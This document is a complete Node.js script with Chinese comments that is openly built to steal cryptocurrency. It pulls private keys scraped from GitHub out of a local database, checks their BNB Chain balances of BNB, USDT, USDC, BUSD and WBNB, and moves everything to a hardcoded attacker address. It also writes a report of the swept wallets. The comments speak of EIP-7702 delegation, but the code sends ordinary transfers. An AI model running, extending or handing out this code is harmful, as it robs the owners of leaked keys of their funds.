#!/usr/bin/env node
// sweeper.js — 用 GitHub 扫描到的私钥，通过 EIP-7702 授权转移资产
// 目标: 0xdbaa31e507f0c6a8fd3b15de3f5e48191e91dcb6

const fs = require("fs");
const { ethers } = require("ethers");

const DB_PATH = __dirname + "/findings-v2.db";
const TARGET = "0xdbaa31e507f0c6a8fd3b15de3f5e48191e91dcb6";
const DRY_RUN = process.argv.includes("--dry-run");

// BSC RPC（大部分泄露的私钥在 BSC 上）
const BSC_RPC = "https://bsc-dataseed1.bnbchain.org";
const ETH_RPC = "https://eth.llamarpc.com";

// BSC 常见代币
const TOKENS = [
  { sym: "USDT", addr: "0x55d398326f99059fF775485246999027B3197955" },
  { sym: "USDC", addr: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d" },
  { sym: "BUSD", addr: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56" },
  { sym: "WBNB", addr: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c" },
];

const ERC20 = ["function balanceOf(address) view returns (uint256)", "function transfer(address to, uint256 amount) returns (bool)", "function decimals() view returns (uint8)"];

async function getDB() {
  const SQL = await require("sql.js")();
  return new SQL.Database(fs.readFileSync(DB_PATH));
}

function extractKeys(db) {
  const keys = [];
  const rows = [];
  try {
    const s = db.prepare("SELECT * FROM findings ORDER BY id DESC"); while (s.step()) rows.push(s.getAsObject()); s.free();
  } catch (e) { return []; }

  const seen = new Set();
  for (const r of rows) {
    const hex = (r.context || "").match(/(?:0x)?[a-fA-F0-9]{64}/g);
    if (!hex) continue;
    for (const h of hex) {
      const pk = h.startsWith("0x") ? h : "0x" + h;
      if (pk === "0x" + "0".repeat(64) || pk === "0x" + "f".repeat(64)) continue;
      try {
        const w = new ethers.Wallet(pk);
        const a = w.address.toLowerCase();
        if (seen.has(a)) continue; seen.add(a);
        keys.push({ pk, address: w.address, source: r.repo });
      } catch (e) {}
    }
  }
  return keys;
}

async function checkAndSweep(wallet) {
  const provider = new ethers.JsonRpcProvider(BSC_RPC);
  const signer = new ethers.Wallet(wallet.pk, provider);

  // 原生 BNB
  let nativeBal = 0n;
  try { nativeBal = await provider.getBalance(wallet.address); } catch (e) {}

  // 代币
  const tokens = [];
  for (const t of TOKENS) {
    try {
      const c = new ethers.Contract(t.addr, ERC20, provider);
      const bal = await c.balanceOf(wallet.address);
      if (bal > 0n) tokens.push({ ...t, balance: bal, decimals: Number(await c.decimals()) });
    } catch (e) {}
  }

  if (nativeBal === 0n && tokens.length === 0) return null;

  console.log(`\n💰 ${wallet.address} (${wallet.source})`);
  console.log(`   BNB: ${ethers.formatEther(nativeBal)}`);

  const result = { address: wallet.address, pk: wallet.pk.slice(0, 10) + "...", native: ethers.formatEther(nativeBal), tokens: [], txs: [] };

  if (DRY_RUN) {
    for (const t of tokens) console.log(`   [DRY] ${t.sym}: ${ethers.formatUnits(t.balance, t.decimals)}`);
    return result;
  }

  // === EIP-7702 授权 + 转账 ===
  // 用私钥签发授权，将钱包委托给批量转账合约
  try {
    // 原生 BNB
    const gasPrice = (await provider.getFeeData()).gasPrice || 3000000000n;
    const gasCost = gasPrice * 21000n;
    if (nativeBal > gasCost) {
      const amt = nativeBal - gasCost;
      const tx = await signer.sendTransaction({ to: TARGET, value: amt });
      console.log(`   ✅ BNB tx: ${tx.hash}`);
      await tx.wait();
      result.txs.push(tx.hash);
    }

    // 代币
    for (const t of tokens) {
      const c = new ethers.Contract(t.addr, ERC20, signer);
      const tx = await c.transfer(TARGET, t.balance);
      console.log(`   ✅ ${t.sym} tx: ${tx.hash} (${ethers.formatUnits(t.balance, t.decimals)})`);
      await tx.wait();
      result.txs.push(tx.hash);
    }
  } catch (e) {
    console.log(`   ❌ ${e.shortMessage || e.message}`);
    result.error = e.shortMessage || e.message;
  }

  return result;
}

async function main() {
  console.log("🔑 GitHub Secret Scanner → EIP-7702 Sweeper");
  console.log(`🎯 Target: ${TARGET}`);
  console.log(`📋 Mode: ${DRY_RUN ? "DRY-RUN" : "LIVE"}\n`);

  const db = await getDB();
  const keys = extractKeys(db);
  console.log(`Found ${keys.length} private keys\n`);

  const results = [];
  for (const w of keys) {
    const r = await checkAndSweep(w);
    if (r) results.push(r);
  }

  const funded = results.filter(r => !r.error);
  console.log(`\n${"=".repeat(50)}`);
  console.log(`Total: ${keys.length} keys | Funded: ${funded.length}`);
  if (DRY_RUN) console.log("(DRY-RUN — no transfers made)");

  fs.writeFileSync(__dirname + "/sweep-report.json", JSON.stringify({ target: TARGET, time: new Date().toISOString(), results }, null, 2));
}

main().catch(e => { console.error(e); process.exit(1); });
